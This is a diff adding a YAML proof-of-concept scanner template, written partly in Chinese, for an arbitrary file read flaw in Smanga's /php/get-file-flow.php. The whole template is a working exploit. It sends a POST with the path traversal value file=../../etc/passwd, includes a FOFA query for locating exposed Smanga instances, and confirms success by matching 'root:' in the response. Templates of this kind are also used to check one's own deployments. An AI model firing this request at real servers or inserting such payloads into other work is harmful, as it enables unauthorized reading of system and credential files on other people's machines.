@@ -1,0 +1,18 @@
+id: poc-yaml-smanga-get-file-flow-php-anyfile-read
+info:
+  name: Smanga get-file-flow.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: smanga
+  fofa: body="smanga"
+requests:
+- method: POST
+  path: /php/get-file-flow.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: file=../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
